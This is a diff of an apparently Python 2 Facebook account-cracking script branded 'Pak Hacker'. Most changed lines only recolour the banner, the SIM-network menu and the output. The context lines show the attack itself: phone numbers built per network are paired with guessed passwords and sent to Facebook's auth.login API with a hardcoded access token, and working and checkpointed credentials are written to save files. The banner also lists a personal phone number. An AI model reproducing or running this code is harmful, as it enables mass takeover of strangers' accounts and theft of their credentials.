@@ -56,34 +56,34 @@ def cb():
 ##### Dev : Rana MZ
 ##### LOGO #####
 logo='''
-\033[1;91m             ☸☸☸☸☸☸☸
-\033[1;94m                  ☸☸☸☸☸
-\033[1;93m                       ☸☸☸ 
-\033[1;93m                         ☸☸
-\033[1;93m                           ☸
+\033[1;99m               ☸☸☸☸☸☸☸
+\033[1;99m                 ☸☸☸☸☸
+\033[1;99m                   ☸☸☸ 
+\033[1;99m                    ☸☸
+\033[1;99m                     ☸
 \033[1;93m              ❮●───◇🎲◇───●❯
 \033[1;93m              ❮●─TIPU SULTAN─●❯      
 \033[1;93m               ❮●─LSG  MAKER─●❯
 \033[1;93m               ❮●───◇🎲◇───●❯
- \033[1;93m                              ☸
- \033[1;94m                            ☸☸
- \033[1;94m                          ☸☸☸
- \033[1;91m                        ☸☸☸☸
- \033[1;91m                      ☸☸☸☸☸
+ \033[1;99m                     ☸
+ \033[1;99m                    ☸☸
+ \033[1;99m                   ☸☸☸
+ \033[1;99m                  ☸☸☸☸
+ \033[1;99m                 ☸☸☸☸☸
                                  
 
 \033[1;94m [ TIPU SULTAN ]
 
 \x1b[1;92m=============================
-\x1b[1;93m Coder + Author iS : TIPU SULTAN
-\x1b[1;93m GANG : LSG BRAND TIPU X OMAR X UMAR
-\x1b[1;93m FaceBook : TIPU SULTAN
-\x1b[1;93m Whatsapp:  +923213835809
-\x1b[1;93m Youtube :  TS Official
+\x1b[1;90m Coder + Author iS : TIPU SULTAN
+\x1b[1;92m GANG : LSG BRAND TIPU X OMAR X UMAR
+\x1b[1;98m FaceBook : TIPU SULTAN
+\x1b[1;97m Whatsapp:  +923213835809
+\x1b[1;96m Youtube :  TS Official
 \x1b[1;92m=============================
-\x1b[1;93m     ➾       NOTE !
+\x1b[1;88m     ➾       NOTE ! TIPU BRAND 
 \x1b[1;91m=======================================
-\x1b[1;93m     ➾ LSG OWNERS ( TIPU X OMAR X UMAR )
+\x1b[1;88m     ➾ LSG OWNERS ( TIPU X OMAR X UMAR )
 \x1b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  
 
 CorrectUsername = "Tipu"
@@ -117,13 +117,13 @@ def menu():
 	print "\033[1;92m         [ LSG BRAND { Pak Hacker } ]"
 	print
         print "\033[1;91m          SELECT ANY ONE SIM NETWORK"
-	print "\033[1;92m[1]\033[1;97m╼╼\033[1;93mMOBILINK     (Press 1)"
-	print "\033[1;92m[2]\033[1;97m╼╼\033[1;93mTELENOR      (Press 2)"
-	print "\033[1;92m[3]\033[1;97m╼╼\033[1;93mWARID        (Press 3)"
-	print "\033[1;92m[4]\033[1;97m╼╼\033[1;93mUFONE        (Press 4)"
-	print "\033[1;92m[5]\033[1;97m╼╼\033[1;93mZONG         (Press 5)"
-	print "\033[1;92m[6]\033[1;97m╼╼\033[1;93mUPDATE SYSTEM"
-	print "\033[1;92m[0]\033[1;97m╼╼\033[1;91mEXIT   (Back) "	    
+	print "\033[1;82m[1]\033[1;97m╼╼\033[1;93mMOBILINK     (Press 1)"
+	print "\033[1;83m[2]\033[1;97m╼╼\033[1;93mTELENOR      (Press 2)"
+	print "\033[1;84m[3]\033[1;97m╼╼\033[1;93mWARID        (Press 3)"
+	print "\033[1;85m[4]\033[1;97m╼╼\033[1;93mUFONE        (Press 4)"
+	print "\033[1;86m[5]\033[1;97m╼╼\033[1;93mZONG         (Press 5)"
+	print "\033[1;87m[6]\033[1;97m╼╼\033[1;93mUPDATE SYSTEM"
+	print "\033[1;81m[0]\033[1;97m╼╼\033[1;91mEXIT   (Back) "	    
 	print 50*'\033[1;90m-'
 	action()
 	
@@ -257,14 +257,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m ✓Tipu OK  ✓ \x1b[1;92m|\x1b[1;92m\x1b[ 1;92m|' + k + c + user + ' |\x1b[1;92m\x1b[1;92m | ' + pass1																				
+				print '\x1b[1;90m ✓Tipu OK  ✓ \x1b[1;98m|\x1b[1;98m\x1b[ 1;99m|' + k + c + user + ' |\x1b[1;92m\x1b[1;92m | ' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95\x1b[1;95m ×Tipu Checkpoint × \x1b[1;95m | \x1b[1;95m\x1b[1;95m ' + k + c + user + '|\x1b[1;95m\x1b[1;95m| ' + pass1
+					print '\x1b[1;95\x1b[1;97m ×Tipu Checkpoint × \x1b[1;96m | \x1b[1;94m\x1b[1;94m ' + k + c + user + '|\x1b[1;90m\x1b[1;90m| ' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
